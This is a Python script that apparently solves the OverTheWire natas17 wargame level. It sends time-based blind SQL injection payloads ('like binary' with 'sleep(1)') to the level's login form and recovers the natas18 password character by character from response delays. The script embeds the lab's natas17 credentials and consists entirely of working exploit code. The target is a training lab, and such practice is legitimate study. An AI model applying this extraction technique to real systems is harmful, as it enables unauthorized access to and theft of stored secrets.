#!/bin/python

import requests
import time

letters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
url='http://natas17.natas.labs.overthewire.org/index.php'
auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
payload='natas18" and password like binary "' 
end='%" and sleep(1)#'
password=''
vocabulary=''

if (len(vocabulary) != 0):
    print('Vocabulary already setted')
else:
    for letter in letters:
        username_data = payload + '%' + letter + end
        data = {'username':username_data}
        start_time = time.time()
        response = requests.post(url, data=data, auth=auth)
        end_time =time.time()
        elapsed_time = end_time - start_time
        if(elapsed_time >= 1):
            vocabulary += letter
            print('Vocabulary: ' + vocabulary)

print('Cracking password...')
while len(password) != 32:
    for letter in vocabulary:
        username_data = payload + password + letter + end
        data = {'username':username_data}
        start_time = time.time()
        response = requests.post(url, data=data, auth=auth)
        end_time = time.time()
        elapsed_time = end_time - start_time
        if (elapsed_time >= 1):
            password += letter
            print('Size: ' + str(len(password)) + ' -> ' + password)
            break
print("Password cracked: " + password)
